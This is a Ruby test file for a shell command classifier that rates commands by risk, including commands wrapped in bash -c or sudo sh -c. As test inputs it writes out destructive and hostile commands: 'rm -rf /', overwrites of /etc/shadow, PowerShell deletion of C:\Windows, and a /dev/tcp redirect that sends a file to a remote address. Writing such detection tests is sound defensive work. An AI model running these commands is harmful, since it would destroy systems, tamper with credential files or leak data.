# frozen_string_literal: true

require_relative "../test_helper"
require_relative "../../lib/rubik/security/classifier"

class TestCommandClassifierIntegration < Minitest::Test
  Classifier = Rubik::Security::Classifier

  def test_suppresses_false_positives_in_strings
    res = Classifier.classify('echo "do not run rm -rf /"')
    assert_equal :readonly, res.classification
    assert_equal :low, res.risk

    res2 = Classifier.classify('git commit -m "fix rm -rf / issue"')
    assert_equal :local_effects, res2.classification
    assert_equal :low, res2.risk
  end

  def test_detects_dangerous_root_deletion
    res = Classifier.classify("rm -rf /")
    assert_equal :dangerous, res.classification
    assert_equal :high, res.risk

    res2 = Classifier.classify("sudo rm -rf /")
    assert_equal :dangerous, res2.classification
    assert_equal :high, res2.risk
  end

  def test_detects_system_path_write_redirect
    res = Classifier.classify("echo malicious > /etc/shadow")
    assert_equal :dangerous, res.classification
    assert_equal :high, res.risk
  end

  def test_allows_temp_path_redirects
    res = Classifier.classify("cat file.txt > /tmp/temp_out.txt")
    assert_equal :local_effects, res.classification
    # Only writing to temp path keeps risk lower
    assert_equal ["/tmp/temp_out.txt"], res.write_paths
  end

  def test_detects_dev_tcp_network_redirection
    res = Classifier.classify("cat < /dev/tcp/10.0.0.1/8080")
    assert_equal :dangerous, res.classification
    assert_equal :high, res.risk
  end

  def test_powershell_classification
    res = Classifier.classify("Remove-Item -Recurse C:\\Windows", shell: :powershell)
    assert_equal :dangerous, res.classification
    assert_equal :high, res.risk

    res2 = Classifier.classify("Get-ChildItem -Path C:\\Users", shell: :powershell)
    assert_equal :readonly, res2.classification
    assert_equal :low, res2.risk
  end

  def test_background_command_elevation
    res = Classifier.classify("sleep 10 &")
    assert_equal :local_effects, res.classification
    assert_equal :medium, res.risk
  end

  # Inner system-path elevation must not be silent: blocked-command guidance
  # explains WHY a wrapped segment is dangerous, and for `rm -rf /` inside
  # bash -c the system-path elevation is the only evidence there is.
  def test_inner_system_path_elevation_sets_reason
    res = Classifier.classify('bash -c "rm -rf /"')
    inner = res.commands.first.inner_commands.first
    assert_equal :dangerous, inner.classification
    assert_includes inner.classification_reason, "system path /"
  end

  # Inner redirects must survive delegation: the unwrapped form is blocked
  # with a system-path reason, so the wrapped form must be too — the old
  # argv-only handoff let `bash -c 'echo pwned > /etc/shadow'` through.
  def test_inner_redirect_survives_delegation
    res = Classifier.classify("bash -c 'echo pwned > /etc/shadow'")
    assert_equal :dangerous, res.classification
    assert_equal :high, res.risk

    inner = res.commands.first.inner_commands.first
    assert_equal :dangerous, inner.classification
    assert_includes inner.classification_reason, "elevated by output redirect"
    assert_includes inner.classification_reason, "system path /etc/shadow"
    assert_equal ["/etc/shadow"], res.write_paths
  end

  def test_inner_dev_tcp_redirect_survives_delegation
    res = Classifier.classify("bash -c 'cat f > /dev/tcp/10.0.0.1/8080'")
    assert_equal :dangerous, res.classification

    inner = res.commands.first.inner_commands.first
    assert_equal :dangerous, inner.classification
    assert_equal "elevated to DANGEROUS: /dev/tcp or /dev/udp access detected", inner.classification_reason
  end

  def test_inner_temp_redirect_stays_safe
    res = Classifier.classify("bash -c 'echo x > /tmp/out.txt'")
    inner = res.commands.first.inner_commands.first
    assert_equal :local_effects, inner.classification
    assert_equal :low, inner.risk
    assert_includes inner.classification_reason, "elevated by output redirect"
    refute_includes inner.classification_reason, "system path"
  end

  # Nested wrappers: the token-slice outer (sudo) has no redirect objects,
  # but the inner `sh -c` re-parse carries them at its own level.
  def test_nested_wrapper_inner_redirect_elevates
    res = Classifier.classify("sudo sh -c 'echo x > /etc/y'")
    assert_equal :dangerous, res.classification
  end

  def test_inner_read_redirect_stays_inert
    res = Classifier.classify("bash -c 'grep x < /etc/hosts'")
    assert_equal :readonly, res.classification
    inner = res.commands.first.inner_commands.first
    assert_equal :readonly, inner.classification
  end

  # Expression-level elevation (mutating pipeline + system directory) is the
  # one DANGEROUS producer with no dangerous command — the composed reason
  # must ride on the ExpressionResult itself.
  def test_expression_level_elevation_sets_reason
    res = Classifier.classify("cd /etc && touch x")
    assert_equal :dangerous, res.classification
    assert_equal "mutating pipeline (touch) touches system directory /etc", res.classification_reason
  end

  def test_expression_reason_nil_without_expression_elevation
    res = Classifier.classify("git status")
    assert_nil res.classification_reason
  end
end
